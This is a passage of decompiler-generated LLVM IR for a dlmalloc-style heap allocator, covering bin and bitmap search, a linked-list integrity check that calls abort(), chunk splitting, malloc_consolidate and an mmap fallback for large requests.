  br i1 %v1_80535d4, label %dec_label_pc_80534f7, label %dec_label_pc_80535da

dec_label_pc_80535da:                             ; preds = %bb84, %dec_label_pc_80535c8.preheader
  br i1 %v8_805348b, label %dec_label_pc_8053668, label %dec_label_pc_80535e8

dec_label_pc_80535e8:                             ; preds = %dec_label_pc_80535da
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_80535ec = mul i32 %stack_var_-40.0.ph, 8
  %v2_80535ec = add i32 %v1_80535ec, ptrtoint (i32* @global_var_8065c0c.959 to i32)
  store i32 %v2_80535ec, i32* %edx.global-to-local, align 4
  %v1_80535f3 = add i32 %v1_80535ec, add (i32 ptrtoint (i32* @global_var_8065c0c.959 to i32), i32 12)
  %v2_80535f3 = inttoptr i32 %v1_80535f3 to i32*
  %storemerge1.pre = load i32, i32* %v2_80535f3, align 4
  br label %dec_label_pc_8053664

dec_label_pc_80535f8:                             ; preds = %dec_label_pc_8053664
  %v1_80535f8 = add i32 %v4_805360f, 4
  %v2_80535f8 = inttoptr i32 %v1_80535f8 to i32*
  %v3_80535f8 = load i32, i32* %v2_80535f8, align 4
  store i32 %v3_80535f8, i32* %ebx.global-to-local, align 4
  %v1_80535fb = add i32 %v4_805360f, 12
  %v2_80535fb = inttoptr i32 %v1_80535fb to i32*
  %v3_80535fb = load i32, i32* %v2_80535fb, align 4
  store i32 %v3_80535fb, i32* @ecx, align 4
  %v1_80535fe = and i32 %v3_80535f8, -4
  store i32 %v1_80535fe, i32* @ebx, align 4
  %v10_8053601 = icmp ult i32 %v1_80535fe, %v1_80537da
  br i1 %v10_8053601, label %dec_label_pc_8053664, label %dec_label_pc_8053607

dec_label_pc_8053607:                             ; preds = %dec_label_pc_80535f8
  %v1_8053607 = add i32 %v4_805360f, 8
  %v2_8053607 = inttoptr i32 %v1_8053607 to i32*
  %v3_8053607 = load i32, i32* %v2_8053607, align 4
  store i32 %v3_8053607, i32* @edx, align 4
  %v1_805360a = add i32 %v3_8053607, 12
  %v2_805360a = inttoptr i32 %v1_805360a to i32*
  %v3_805360a = load i32, i32* %v2_805360a, align 4
  %v15_805360a = icmp eq i32 %v3_805360a, %v4_805360f
  %v1_805360d = icmp eq i1 %v15_805360a, false
  br i1 %v1_805360d, label %dec_label_pc_8053614, label %dec_label_pc_805360f

dec_label_pc_805360f:                             ; preds = %dec_label_pc_8053607
  %v1_805360f = add i32 %v3_80535fb, 8
  %v2_805360f = inttoptr i32 %v1_805360f to i32*
  %v3_805360f = load i32, i32* %v2_805360f, align 4
  %v15_805360f = icmp eq i32 %v3_805360f, %v4_805360f
  br i1 %v15_805360f, label %dec_label_pc_8053619, label %dec_label_pc_8053614

dec_label_pc_8053614:                             ; preds = %dec_label_pc_805360f, %dec_label_pc_8053607
  %v0_8053614 = call i32 @abort()
  store i32 %v0_8053614, i32* %eax.global-to-local, align 4
  %v0_8053619.pre = load i32, i32* @ebx, align 4
  %v0_805361f.pre = load i32, i32* @ecx, align 4
  %v1_805361f.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053619

dec_label_pc_8053619:                             ; preds = %dec_label_pc_805360f, %dec_label_pc_8053614
  %v1_805361f = phi i32 [ %v3_8053607, %dec_label_pc_805360f ], [ %v1_805361f.pre, %dec_label_pc_8053614 ]
  %v0_805361f = phi i32 [ %v3_80535fb, %dec_label_pc_805360f ], [ %v0_805361f.pre, %dec_label_pc_8053614 ]
  %v0_8053619 = phi i32 [ %v1_80535fe, %dec_label_pc_805360f ], [ %v0_8053619.pre, %dec_label_pc_8053614 ]
  %v5_805361b = sub i32 %v0_8053619, %v1_80537da
  store i32 %v5_805361b, i32* %esi.global-to-local, align 4
  %v2_805361f = add i32 %v1_805361f, 12
  %v3_805361f = inttoptr i32 %v2_805361f to i32*
  store i32 %v0_805361f, i32* %v3_805361f, align 4
  %v0_8053622 = load i32, i32* @edx, align 4
  %v1_8053622 = load i32, i32* @ecx, align 4
  %v2_8053622 = add i32 %v1_8053622, 8
  %v3_8053622 = inttoptr i32 %v2_8053622 to i32*
  store i32 %v0_8053622, i32* %v3_8053622, align 4
  %v0_8053625 = load i32, i32* %esi.global-to-local, align 4
  %v0_8053628 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053628 = add i32 %v0_8053628, 8
  store i32 %v1_8053628, i32* @ecx, align 4
  %tmp127 = icmp ult i32 %v0_8053625, 16
  br i1 %tmp127, label %dec_label_pc_8053b29, label %dec_label_pc_8053631

dec_label_pc_8053631:                             ; preds = %dec_label_pc_8053619
  %v2_8053635 = add i32 %v0_8053628, %v1_80537da
  store i32 %v2_8053635, i32* @edx, align 4
  %v1_8053638 = or i32 %v1_80537da, 1
  store i32 %v1_8053638, i32* %ebx.global-to-local, align 4
  %v2_805363b = add i32 %v0_8053628, 4
  %v3_805363b = inttoptr i32 %v2_805363b to i32*
  store i32 %v1_8053638, i32* %v3_805363b, align 4
  %v0_805363e = load i32, i32* %esi.global-to-local, align 4
  %v1_8053640 = or i32 %v0_805363e, 1
  store i32 %v1_8053640, i32* %eax.global-to-local, align 4
  %v0_8053643 = load i32, i32* @edx, align 4
  %v1_8053643 = load i32, i32* @ebp, align 4
  %v2_8053643 = add i32 %v1_8053643, 8
  %v3_8053643 = inttoptr i32 %v2_8053643 to i32*
  store i32 %v0_8053643, i32* %v3_8053643, align 4
  %v0_8053646 = load i32, i32* @edx, align 4
  %v1_8053646 = load i32, i32* @ebp, align 4
  %v2_8053646 = add i32 %v1_8053646, 12
  %v3_8053646 = inttoptr i32 %v2_8053646 to i32*
  store i32 %v0_8053646, i32* %v3_8053646, align 4
  %v0_8053649 = load i32, i32* @edx, align 4
  %v1_8053649 = add i32 %v0_8053649, 8
  %v2_8053649 = inttoptr i32 %v1_8053649 to i32*
  store i32 ptrtoint (i32* @global_var_8065c14.961 to i32), i32* %v2_8053649, align 4
  %v0_8053650 = load i32, i32* @edx, align 4
  %v1_8053650 = add i32 %v0_8053650, 12
  %v2_8053650 = inttoptr i32 %v1_8053650 to i32*
  store i32 ptrtoint (i32* @global_var_8065c14.961 to i32), i32* %v2_8053650, align 4
  %v0_8053657 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053657 = load i32, i32* @edx, align 4
  %v2_8053657 = add i32 %v1_8053657, 4
  %v3_8053657 = inttoptr i32 %v2_8053657 to i32*
  store i32 %v0_8053657, i32* %v3_8053657, align 4
  %v0_805365a = load i32, i32* %esi.global-to-local, align 4
  %v1_805365a = load i32, i32* @edx, align 4
  %v3_805365a = add i32 %v1_805365a, %v0_805365a
  %v4_805365a = inttoptr i32 %v3_805365a to i32*
  store i32 %v0_805365a, i32* %v4_805365a, align 4
  br label %dec_label_pc_8053b2e

dec_label_pc_8053664:                             ; preds = %dec_label_pc_80535f8, %dec_label_pc_80535e8
  %v4_805360f = phi i32 [ %storemerge1.pre, %dec_label_pc_80535e8 ], [ %v3_80535fb, %dec_label_pc_80535f8 ]
  store i32 %v4_805360f, i32* %eax.global-to-local, align 4
  %v12_8053664 = icmp eq i32 %v4_805360f, %v2_80535ec
  %v1_8053666 = icmp eq i1 %v12_8053664, false
  br i1 %v1_8053666, label %dec_label_pc_80535f8, label %dec_label_pc_8053668.loopexit

dec_label_pc_8053668.loopexit:                    ; preds = %dec_label_pc_8053664
  br label %dec_label_pc_8053668

dec_label_pc_8053668:                             ; preds = %dec_label_pc_8053668.loopexit, %dec_label_pc_80535da
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_8053671 = add i32 %stack_var_-40.0.ph, 1
  %v2_8053674 = udiv i32 %v1_8053671, 32
  store i32 %v2_8053674, i32* @edi, align 4
  %v1_8053677 = mul i32 %v1_8053671, 8
  %v2_8053677 = add i32 %v1_8053677, ptrtoint (i32* @global_var_8065c0c.959 to i32)
  store i32 %v2_8053677, i32* %ebx.global-to-local, align 4
  %v1_805367e = urem i32 %v1_8053671, 32
  %v2_805367e = icmp eq i32 %v1_805367e, 0
  store i32 %v1_805367e, i32* %ecx.global-to-local, align 4
  %v1_8053681 = mul nuw nsw i32 %v2_8053674, 4
  %v2_8053681 = add i32 %v1_8053681, ptrtoint (i32* @global_var_8065f14.963 to i32)
  %v3_8053681 = inttoptr i32 %v2_8053681 to i32*
  %v4_8053681 = load i32, i32* %v3_8053681, align 4
  store i32 %v4_8053681, i32* %edx.global-to-local, align 4
  br i1 %v2_805367e, label %.preheader, label %bb85

bb85:                                             ; preds = %dec_label_pc_8053668
  %v5_8053688 = shl i32 1, %v1_805367e
  store i32 %v5_8053688, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_8053668, %bb85, %dec_label_pc_80536c9
  %v1_805368a = phi i32 [ %v1_805368a.pre, %dec_label_pc_80536c9 ], [ %v4_8053681, %bb85 ], [ %v4_8053681, %dec_label_pc_8053668 ]
  %v0_805368e = phi i32 [ %v0_805368a.pre, %dec_label_pc_80536c9 ], [ %v5_8053688, %bb85 ], [ 1, %dec_label_pc_8053668 ]
  %tmp86 = icmp ule i32 %v0_805368e, %v1_805368a
  %v1_805368e = icmp eq i32 %v0_805368e, 0
  %v1_8053690 = icmp eq i1 %v1_805368e, false
  %or.cond = and i1 %tmp86, %v1_8053690
  br i1 %or.cond, label %dec_label_pc_805368e.dec_label_pc_80536be.preheader_crit_edge, label %dec_label_pc_8053692.preheader

dec_label_pc_805368e.dec_label_pc_80536be.preheader_crit_edge: ; preds = %.preheader
  %v0_80536b912.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80536be.preheader

dec_label_pc_8053692.preheader:                   ; preds = %.preheader
  %v0_8053692.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053692

dec_label_pc_8053692:                             ; preds = %dec_label_pc_8053692.preheader, %dec_label_pc_805369c
  %v0_8053692 = phi i32 [ %v0_8053692.pre, %dec_label_pc_8053692.preheader ], [ %v1_8053692, %dec_label_pc_805369c ]
  %v1_8053692 = add i32 %v0_8053692, 1
  store i32 %v1_8053692, i32* @edi, align 4
  %v6_8053696 = icmp ugt i32 %v1_8053692, 2
  br i1 %v6_8053696, label %dec_label_pc_8053745.loopexit, label %dec_label_pc_805369c

dec_label_pc_805369c:                             ; preds = %dec_label_pc_8053692
  %v1_805369c = mul i32 %v1_8053692, 4
  %v2_805369c = add i32 %v1_805369c, ptrtoint (i32* @global_var_8065f14.963 to i32)
  %v3_805369c = inttoptr i32 %v2_805369c to i32*
  %v4_805369c = load i32, i32* %v3_805369c, align 4
  store i32 %v4_805369c, i32* %edx.global-to-local, align 4
  %v1_80536a3 = icmp eq i32 %v4_805369c, 0
  br i1 %v1_80536a3, label %dec_label_pc_8053692, label %dec_label_pc_80536a7

dec_label_pc_80536a7:                             ; preds = %dec_label_pc_805369c
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_80536ae = mul i32 %v1_8053692, 256
  store i32 %v2_80536ae, i32* %eax.global-to-local, align 4
  %v1_80536b1 = add i32 %v2_80536ae, ptrtoint (i32* @global_var_8065c0c.959 to i32)
  store i32 %v1_80536b1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80536be.preheader

dec_label_pc_80536be.preheader:                   ; preds = %dec_label_pc_805368e.dec_label_pc_80536be.preheader_crit_edge, %dec_label_pc_80536a7
  %v0_80536b912 = phi i32 [ %v1_80536b1, %dec_label_pc_80536a7 ], [ %v0_80536b912.pre, %dec_label_pc_805368e.dec_label_pc_80536be.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_80536a7 ], [ %v0_805368e, %dec_label_pc_805368e.dec_label_pc_80536be.preheader_crit_edge ]
  %v0_80536d0 = phi i32 [ %v4_805369c, %dec_label_pc_80536a7 ], [ %v1_805368a, %dec_label_pc_805368e.dec_label_pc_80536be.preheader_crit_edge ]
  %v2_80536be4 = and i32 %v0_80536d0, %esi.promoted
  %v3_80536be5 = icmp eq i32 %v2_80536be4, 0
  br i1 %v3_80536be5, label %dec_label_pc_80536b9, label %dec_label_pc_80536c2

dec_label_pc_80536b9:                             ; preds = %dec_label_pc_80536be.preheader, %dec_label_pc_80536b9
  %v2_80536bc14 = phi i32 [ %v2_80536bc, %dec_label_pc_80536b9 ], [ %esi.promoted, %dec_label_pc_80536be.preheader ]
  %v0_80536b913 = phi i32 [ %v1_80536b9, %dec_label_pc_80536b9 ], [ %v0_80536b912, %dec_label_pc_80536be.preheader ]
  %v1_80536b9 = add i32 %v0_80536b913, 8
  %v2_80536bc = mul i32 %v2_80536bc14, 2
  %v2_80536be = and i32 %v2_80536bc, %v0_80536d0
  %v3_80536be = icmp eq i32 %v2_80536be, 0
  br i1 %v3_80536be, label %dec_label_pc_80536b9, label %dec_label_pc_80536be.dec_label_pc_80536c2_crit_edge

dec_label_pc_80536be.dec_label_pc_80536c2_crit_edge: ; preds = %dec_label_pc_80536b9
  store i32 %v1_80536b9, i32* %ebx.global-to-local, align 4
  store i32 %v2_80536bc, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80536c2

dec_label_pc_80536c2:                             ; preds = %dec_label_pc_80536be.dec_label_pc_80536c2_crit_edge, %dec_label_pc_80536be.preheader
  %v0_80536d2 = phi i32 [ %v2_80536bc, %dec_label_pc_80536be.dec_label_pc_80536c2_crit_edge ], [ %esi.promoted, %dec_label_pc_80536be.preheader ]
  %v1_80536ec = phi i32 [ %v1_80536b9, %dec_label_pc_80536be.dec_label_pc_80536c2_crit_edge ], [ %v0_80536b912, %dec_label_pc_80536be.preheader ]
  %v1_80536c2 = add i32 %v1_80536ec, 12
  %v2_80536c2 = inttoptr i32 %v1_80536c2 to i32*
  %v3_80536c2 = load i32, i32* %v2_80536c2, align 4
  store i32 %v3_80536c2, i32* @ecx, align 4
  %v12_80536c5 = icmp eq i32 %v3_80536c2, %v1_80536ec
  %v1_80536c7 = icmp eq i1 %v12_80536c5, false
  br i1 %v1_80536c7, label %dec_label_pc_80536dd, label %dec_label_pc_80536c9

dec_label_pc_80536c9:                             ; preds = %dec_label_pc_80536c2
  %v1_80536cb = add i32 %v3_80536c2, 8
  store i32 %v1_80536cb, i32* %ebx.global-to-local, align 4
  %v1_80536ce = sub i32 -1, %v0_80536d2
  store i32 %v1_80536ce, i32* %eax.global-to-local, align 4
  %v2_80536d0 = and i32 %v0_80536d0, %v1_80536ce
  store i32 %v2_80536d0, i32* %edx.global-to-local, align 4
  %v2_80536d2 = mul i32 %v0_80536d2, 2
  store i32 %v2_80536d2, i32* %esi.global-to-local, align 4
  %v1_80536d4 = load i32, i32* @edi, align 4
  %v2_80536d4 = mul i32 %v1_80536d4, 4
  %v3_80536d4 = add i32 %v2_80536d4, ptrtoint (i32* @global_var_8065f14.963 to i32)
  %v4_80536d4 = inttoptr i32 %v3_80536d4 to i32*
  store i32 %v2_80536d0, i32* %v4_80536d4, align 4
  %v0_805368a.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_805368a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_80536dd:                             ; preds = %dec_label_pc_80536c2
  %v1_80536dd = add i32 %v3_80536c2, 4
  %v2_80536dd = inttoptr i32 %v1_80536dd to i32*
  %v3_80536dd = load i32, i32* %v2_80536dd, align 4
  store i32 %v3_80536dd, i32* %edx.global-to-local, align 4
  %v1_80536e0 = add i32 %v3_80536c2, 12
  %v2_80536e0 = inttoptr i32 %v1_80536e0 to i32*
  %v3_80536e0 = load i32, i32* %v2_80536e0, align 4
  store i32 %v3_80536e0, i32* %eax.global-to-local, align 4
  %v1_80536e3 = and i32 %v3_80536dd, -4
  store i32 %v1_80536e3, i32* @edx, align 4
  %v5_80536e8 = sub i32 %v1_80536e3, %v1_80537da
  store i32 %v5_80536e8, i32* %esi.global-to-local, align 4
  store i32 %v3_80536e0, i32* %v2_80536c2, align 4
  %v0_80536ef = load i32, i32* %ebx.global-to-local, align 4
  %v1_80536ef = load i32, i32* %eax.global-to-local, align 4
  %v2_80536ef = add i32 %v1_80536ef, 8
  %v3_80536ef = inttoptr i32 %v2_80536ef to i32*
  store i32 %v0_80536ef, i32* %v3_80536ef, align 4
  %v0_80536f2 = load i32, i32* %esi.global-to-local, align 4
  %tmp128 = icmp ult i32 %v0_80536f2, 16
  br i1 %tmp128, label %dec_label_pc_80536f7, label %dec_label_pc_80536fe

dec_label_pc_80536f7:                             ; preds = %dec_label_pc_80536dd
  %v0_80536f7 = load i32, i32* @ecx, align 4
  %v1_80536f7 = load i32, i32* @edx, align 4
  %v2_80536f7 = add i32 %v0_80536f7, 4
  %v3_80536f7 = add i32 %v2_80536f7, %v1_80536f7
  %v4_80536f7 = inttoptr i32 %v3_80536f7 to i32*
  %v5_80536f7 = load i32, i32* %v4_80536f7, align 4
  %v6_80536f7 = or i32 %v5_80536f7, 1
  store i32 %v6_80536f7, i32* %v4_80536f7, align 4
  br label %dec_label_pc_805373d

dec_label_pc_80536fe:                             ; preds = %dec_label_pc_80536dd
  store i32 %v1_80537da, i32* %eax.global-to-local, align 4
  %v0_8053707 = load i32, i32* @ecx, align 4
  %v2_8053707 = add i32 %v0_8053707, %v1_80537da
  store i32 %v2_8053707, i32* @edx, align 4
  %v1_805370a = load i32, i32* @ebp, align 4
  %v2_805370a = add i32 %v1_805370a, 8
  %v3_805370a = inttoptr i32 %v2_805370a to i32*
  store i32 %v2_8053707, i32* %v3_805370a, align 4
  %v0_805370d = load i32, i32* @edx, align 4
  %v1_805370d = load i32, i32* @ebp, align 4
  %v2_805370d = add i32 %v1_805370d, 12
  %v3_805370d = inttoptr i32 %v2_805370d to i32*
  store i32 %v0_805370d, i32* %v3_805370d, align 4
  %v0_8053710 = load i32, i32* @edx, align 4
  %v1_8053710 = add i32 %v0_8053710, 8
  %v2_8053710 = inttoptr i32 %v1_8053710 to i32*
  store i32 ptrtoint (i32* @global_var_8065c14.961 to i32), i32* %v2_8053710, align 4
  %v0_8053717 = load i32, i32* @edx, align 4
  %v1_8053717 = add i32 %v0_8053717, 12
  %v2_8053717 = inttoptr i32 %v1_8053717 to i32*
  store i32 ptrtoint (i32* @global_var_8065c14.961 to i32), i32* %v2_8053717, align 4
  br i1 %v6_8053493, label %dec_label_pc_8053726, label %dec_label_pc_8053720

dec_label_pc_8053720:                             ; preds = %dec_label_pc_80536fe
  %v0_8053720 = load i32, i32* @edx, align 4
  store i32 %v0_8053720, i32* @global_var_8065c10.960, align 16
  br label %dec_label_pc_8053726

dec_label_pc_8053726:                             ; preds = %dec_label_pc_80536fe, %dec_label_pc_8053720
  %v4_8053726 = or i32 %v1_80537da, 1
  %v0_805372b = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8053726, i32* %ebx.global-to-local, align 4
  %v1_8053731 = or i32 %v0_805372b, 1
  store i32 %v1_8053731, i32* %eax.global-to-local, align 4
  %v1_8053734 = load i32, i32* @ecx, align 4
  %v2_8053734 = add i32 %v1_8053734, 4
  %v3_8053734 = inttoptr i32 %v2_8053734 to i32*
  store i32 %v4_8053726, i32* %v3_8053734, align 4
  %v0_8053737 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053737 = load i32, i32* @edx, align 4
  %v3_8053737 = add i32 %v1_8053737, %v0_8053737
  %v4_8053737 = inttoptr i32 %v3_8053737 to i32*
  store i32 %v0_8053737, i32* %v4_8053737, align 4
  %v0_805373a = load i32, i32* %eax.global-to-local, align 4
  %v1_805373a = load i32, i32* @edx, align 4
  %v2_805373a = add i32 %v1_805373a, 4
  %v3_805373a = inttoptr i32 %v2_805373a to i32*
  store i32 %v0_805373a, i32* %v3_805373a, align 4
  br label %dec_label_pc_805373d

dec_label_pc_805373d:                             ; preds = %dec_label_pc_80536f7, %dec_label_pc_8053726
  %v0_805373d = load i32, i32* @ecx, align 4
  %v1_805373d = add i32 %v0_805373d, 8
  store i32 %v1_805373d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053b3f

dec_label_pc_8053745.loopexit:                    ; preds = %dec_label_pc_8053692
  br label %dec_label_pc_8053745

dec_label_pc_8053745:                             ; preds = %dec_label_pc_8053745.loopexit, %dec_label_pc_805344d, %dec_label_pc_8053455
  %v0_8053745 = load i32, i32* @global_var_8065c0c.959, align 4
  store i32 %v0_8053745, i32* @ebx, align 4
  %v1_805374f = add i32 %v1_80537da, 16
  store i32 %v1_805374f, i32* @esi, align 4
  %v1_8053752 = add i32 %v0_8053745, 4
  %v2_8053752 = inttoptr i32 %v1_8053752 to i32*
  %v3_8053752 = load i32, i32* %v2_8053752, align 4
  %v1_8053759 = and i32 %v3_8053752, -4
  store i32 %v1_8053759, i32* %ecx.global-to-local, align 4
  %v7_805375c = icmp ult i32 %v1_8053759, %v1_805374f
  br i1 %v7_805375c, label %dec_label_pc_805377c, label %dec_label_pc_8053760

dec_label_pc_8053760:                             ; preds = %dec_label_pc_8053745
  %v2_8053764 = add i32 %v0_8053745, %v1_80537da
  store i32 %v2_8053764, i32* @edx, align 4
  %v1_8053767 = or i32 %v1_80537da, 1
  store i32 %v1_8053767, i32* %eax.global-to-local, align 4
  store i32 %v2_8053764, i32* @global_var_8065c0c.959, align 4
  store i32 %v1_8053767, i32* %v2_8053752, align 4
  %v0_8053773 = load i32, i32* %ecx.global-to-local, align 4
  %v5_8053773 = sub i32 %v0_8053773, %v1_80537da
  store i32 %v5_8053773, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053acf

dec_label_pc_805377c:                             ; preds = %dec_label_pc_8053745
  %v0_805377c = load i32, i32* @global_var_8065f3c.964, align 4
  store i32 %v0_805377c, i32* %edx.global-to-local, align 4
  %v0_8053782 = load i8, i8* @global_var_8065be0.958, align 32
  %v1_8053782 = and i8 %v0_8053782, 2
  %v2_8053782 = icmp eq i8 %v1_8053782, 0
  br i1 %v2_8053782, label %dec_label_pc_80537b0, label %dec_label_pc_805378b

dec_label_pc_805378b:                             ; preds = %dec_label_pc_805377c
  store i32 ptrtoint (i8* @global_var_8065be0.958 to i32), i32* %stack_var_-92, align 4
  %v2_8053793 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8065be0.958 to i32*))
  store i32 ptrtoint (i8* @global_var_8065be0.958 to i32), i32* @ebx, align 4
  %v1_805379d = add i32 %v1_80537da, -7
  store i32 %v1_805379d, i32* %eax.global-to-local, align 4
  store i32 %v1_805379d, i32* %stack_var_-92, align 4
  %v1_80537a1 = call i32 @malloc(i32 %v1_805379d)
  store i32 %v1_80537a1, i32* %eax.global-to-local, align 4
  store i32 %v1_80537a1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053b3f

dec_label_pc_80537b0:                             ; preds = %dec_label_pc_805377c
  %v1_80537b0 = add i32 %v0_805377c, -1
  store i32 %v1_80537b0, i32* @ecx, align 4
  store i32 %v1_80537da, i32* @ebx, align 4
  %v1_80537bb = load i32, i32* @global_var_8065f2c.965, align 4
  %v7_80537bb = icmp ult i32 %v1_80537da, %v1_80537bb
  br i1 %v7_80537bb, label %dec_label_pc_805387d, label %dec_label_pc_80537c7

dec_label_pc_80537c7:                             ; preds = %dec_label_pc_80537b0
  %v0_80537c7 = load i32, i32* @global_var_8065f30.966, align 16
  store i32 %v0_80537c7, i32* %eax.global-to-local, align 4
  %v1_80537cc = load i32, i32* @global_var_8065f34.967, align 4
  %v5_80537d2 = icmp slt i32 %v0_80537c7, %v1_80537cc
  br i1 %v5_80537d2, label %dec_label_pc_80537d8, label %dec_label_pc_805387d

dec_label_pc_80537d8:                             ; preds = %dec_label_pc_80537c7
  %v2_80537da = add i32 %v1_80537da, 10
  %v3_80537da = add i32 %v2_80537da, %v0_805377c
  %v1_80537de = sub i32 0, %v0_805377c
  store i32 %v1_80537de, i32* %eax.global-to-local, align 4
  %v2_80537e0 = and i32 %v3_80537da, %v1_80537de
  store i32 %v2_80537e0, i32* @ebx, align 4
  %tmp129 = icmp ugt i32 %v2_80537e0, %v1_80537da
  br i1 %tmp129, label %dec_label_pc_80537ec, label %dec_label_pc_805387d

dec_label_pc_80537ec:                             ; preds = %dec_label_pc_80537d8
  store i32 0, i32* %stack_var_-92, align 4
  %v8_80537f9 = call i32 @mmap(i32 0, i32 %v2_80537e0, i32 3, i32 34, i32 0, i32 0, i32 %v1_80537b0, i32 %v1_80537b0)
  store i32 %v8_80537f9, i32* %eax.global-to-local, align 4
  store i32 %v8_80537f9, i32* @edx, align 4
  %v10_8053803 = icmp eq i32 %v8_80537f9, -1
  br i1 %v10_8053803, label %dec_label_pc_80537ec.dec_label_pc_805387d_crit_edge, label %dec_label_pc_8053808

dec_label_pc_80537ec.dec_label_pc_805387d_crit_edge: ; preds = %dec_label_pc_80537ec
  %v0_805387d.pre = load i32, i32* @global_var_8065c0c.959, align 4
  br label %dec_label_pc_805387d

dec_label_pc_8053808:                             ; preds = %dec_label_pc_80537ec
  %v1_805380a = urem i32 %v8_80537f9, 8
  %v2_805380a = icmp eq i32 %v1_805380a, 0
  store i32 %v1_805380a, i32* @ecx, align 4
  br i1 %v2_805380a, label %dec_label_pc_8053822, label %dec_label_pc_805380f

dec_label_pc_805380f:                             ; preds = %dec_label_pc_8053808
  %v0_8053814 = load i32, i32* @ebx, align 4
  %v2_8053816 = sub nsw i32 8, %v1_805380a
  store i32 %v2_8053816, i32* %eax.global-to-local, align 4
  %v2_8053818 = add i32 %v2_8053816, %v8_80537f9
  store i32 %v2_8053818, i32* @edx, align 4
  %v2_805381a = sub i32 %v0_8053814, %v2_8053816
  store i32 %v2_805381a, i32* %esi.global-to-local, align 4
  %v2_805381c = inttoptr i32 %v2_8053818 to i32*
  store i32 %v2_8053816, i32* %v2_805381c, align 4
  br label %dec_label_pc_805382a

dec_label_pc_8053822:                             ; preds = %dec_label_pc_8053808
  %v1_8053822 = inttoptr i32 %v8_80537f9 to i32*
  store i32 0, i32* %v1_8053822, align 4
  br label %dec_label_pc_805382a

dec_label_pc_805382a:                             ; preds = %dec_label_pc_805380f, %dec_label_pc_8053822
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_805380f ], [ @ebx, %dec_label_pc_8053822 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_805382a = or i32 %storemerge, 2
  %v1_805382d = load i32, i32* @edx, align 4
  %v2_805382d = add i32 %v1_805382d, 4
  %v3_805382d = inttoptr i32 %v2_805382d to i32*
  store i32 %v1_805382a, i32* %v3_805382d, align 4
  %v0_8053830 = load i32, i32* @global_var_8065f30.966, align 16
  %v1_8053835 = add i32 %v0_8053830, 1
  store i32 %v1_8053835, i32* %eax.global-to-local, align 4
  store i32 %v1_8053835, i32* @global_var_8065f30.966, align 16
  %v1_805383b = load i32, i32* @global_var_8065f38.968, align 8
  %v7_8053841 = icmp sgt i32 %v1_8053835, %v1_805383b
  br i1 %v7_8053841, label %dec_label_pc_8053843, label %dec_label_pc_8053848

dec_label_pc_8053843:                             ; preds = %dec_label_pc_805382a
  store i32 %v1_8053835, i32* @global_var_8065f38.968, align 8
  br label %dec_label_pc_8053848

dec_label_pc_8053848:                             ; preds = %dec_label_pc_805382a, %dec_label_pc_8053843
  %v0_8053848 = load i32, i32* @global_var_8065f44.969, align 4
  %v1_805384d = load i32, i32* @ebx, align 4
  %v2_805384d = add i32 %v1_805384d, %v0_8053848
  store i32 %v2_805384d, i32* %eax.global-to-local, align 4
  store i32 %v2_805384d, i32* @global_var_8065f44.969, align 4
  %v1_8053854 = load i32, i32* @global_var_8065f50.970, align 16
  %tmp130 = icmp ugt i32 %v2_805384d, %v1_8053854
  br i1 %tmp130, label %dec_label_pc_805385c, label %dec_label_pc_8053861

dec_label_pc_805385c:                             ; preds = %dec_label_pc_8053848
  store i32 %v2_805384d, i32* @global_var_8065f50.970, align 16
  br label %dec_label_pc_8053861

dec_label_pc_8053861:                             ; preds = %dec_label_pc_8053848, %dec_label_pc_805385c
  %v1_8053861 = load i32, i32* @global_var_8065f48.971, align 8
  %v2_8053861 = add i32 %v1_8053861, %v2_805384d
  store i32 %v2_8053861, i32* %eax.global-to-local, align 4
  %v1_8053867 = load i32, i32* @global_var_8065f54.972, align 4
  %tmp131 = icmp ugt i32 %v2_8053861, %v1_8053867
  br i1 %tmp131, label %dec_label_pc_8053873, label %dec_label_pc_80534c4

dec_label_pc_8053873:                             ; preds = %dec_label_pc_8053861
  store i32 %v2_8053861, i32* @global_var_8065f54.972, align 4
  br label %dec_label_pc_80534c4

dec_label_pc_805387d:                             ; preds = %dec_label_pc_80537d8, %dec_label_pc_80537ec.dec_label_pc_805387d_crit_edge, %dec_label_pc_80537c7, %dec_label_pc_80537b0
  %v0_805387d = phi i32 [ %v0_805387d.pre, %dec_label_pc_80537ec.dec_label_pc_805387d_crit_edge ], [ %v0_8053745, %dec_label_pc_80537c7 ], [ %v0_8053745, %dec_label_pc_80537d8 ], [ %v0_8053745, %dec_label_pc_80537b0 ]
  store i32 %v0_805387d, i32* %eax.global-to-local, align 4
  %v1_8053886 = add i32 %v0_805387d, 4
  %v2_8053886 = inttoptr i32 %v1_8053886 to i32*
  %v3_8053886 = load i32, i32* %v2_8053886, align 4
  %v1_8053890 = and i32 %v3_8053886, -4
  %v2_8053890 = icmp eq i32 %v1_8053890, 0
  store i32 %v1_8053890, i32* @ebp, align 4
  %v1_8053893 = load i32, i32* @global_var_8065f28.973, align 8
  %v2_8053893 = add i32 %v1_8053893, %v1_805374f
  store i32 %v2_8053893, i32* %eax.global-to-local, align 4
  %v0_8053899 = load i8, i8* @global_var_8065f40.974, align 64
  %v1_8053899 = urem i8 %v0_8053899, 2
  %v2_8053899 = icmp eq i8 %v1_8053899, 0
  br i1 %v2_8053899, label %dec_label_pc_80538a4, label %dec_label_pc_80538a2

dec_label_pc_80538a2:                             ; preds = %dec_label_pc_805387d
